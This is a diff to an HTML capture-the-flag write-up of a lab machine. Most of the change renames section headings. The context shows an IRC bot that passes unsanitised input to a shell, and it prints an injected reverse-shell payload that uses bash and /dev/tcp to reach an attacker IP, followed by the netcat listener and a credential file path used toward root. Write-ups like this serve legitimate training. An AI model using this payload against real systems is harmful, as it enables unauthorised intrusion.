@@ -82,9 +82,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Sat Sep 18 15:48:36 2021 -- 1 IP address (1 host up) scanned in 22.81 seconds
     </pre>
 
-    <h2>Port 6667 - irc</h2>
+    <h2>Information Gathering</h2>
 
-    <li>The first real point of interest comes from the irc chat room.  I used the program hexchat to connect to the irc server.  There is a room on this irc server named #mailAssistant with a user/bot in it named spaghetti_BoT.  Once in the irc room you can send the message "hello" and the bot responds telling us to send it a DM with "!command"</li>
+    <li>The first real point of interest comes from the irc server on port 6667.  I used the program hexchat to connect to the irc server.  There is a room on this irc server named #mailAssistant with a user/bot in it named spaghetti_BoT.  Once in the irc room you can send the message "hello" and the bot responds telling us to send it a DM with "!command"</li>
 
     <img src="../images/spaghetti/irc_1.png">
 
@@ -111,6 +111,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 
         <li>The user input does not go through any sanitization.  It gets passed directly into the "cmd" variable which then gets executed as a shell command.  In order to exploit this all we need to do is add a pipe before whatever command we want to send in the "description" portion of the command for email issues.</li>
 
+        <h2>Foothold</h2>
+
         <li>I send a command and receieve a reverse shell on 4444</li>
         <ul>
             <li>Sent: email:test@test.com description:| bash -c &#039;bash -i &gt;&amp; /dev/tcp/192.168.49.248/4444 0&gt;&amp;1&#039;</li>
@@ -132,7 +134,7 @@ zsh: suspended  nc -lvnp 4444
 [1]  + continued  nc -lvnp 4444
         </pre>
 
-        <h2>Getting Root</h2>
+        <h2>Privilege Escalation - Root</h2>
 
         <li>At this point we already know mysql is running on the box.  So I look for the credentials.  They are found in /var/www/config.local.php</li>
 
